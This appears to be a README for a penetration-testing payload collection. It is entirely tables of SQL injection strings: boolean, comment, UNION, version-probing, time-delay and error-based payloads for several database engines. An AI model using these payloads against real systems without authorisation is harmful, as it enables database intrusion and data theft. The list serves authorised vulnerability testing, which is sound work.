SQL Injection Payloads

SQL injection payload collection for testing database vulnerabilities.

Folder Contents

This folder contains SQL Injection payloads for database testing.

Basic SQLi Payloads

Type Payload
Boolean Based ' OR '1'='1
Boolean Based (Numeric) OR 1=1
Comment Based ' OR 1=1--
Hash Comment ' OR 1=1#
Multi-line Comment ' OR 1=1/*
UNION Based ' UNION SELECT NULL--
UNION (2 columns) ' UNION SELECT NULL,NULL--
UNION (3 columns) ' UNION SELECT NULL,NULL,NULL--
Version Detection ' UNION SELECT @@version--
Database Name ' UNION SELECT database()--

Time-Based Payloads

Database Payload
MySQL ' OR SLEEP(5)--
MySQL (Benchmark) ' OR BENCHMARK(1000000,MD5('A'))--
PostgreSQL ' OR pg_sleep(5)--
SQL Server ' OR WAITFOR DELAY '0:0:5'--
Oracle ' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

Error-Based Payloads

' AND 1=CONVERT(int,@@version) AND '1'='1
' AND extractvalue(1,concat(0x7e,version())) AND '1'='1
' AND updatexml(1,concat(0x7e,version()),1) AND '1'='1
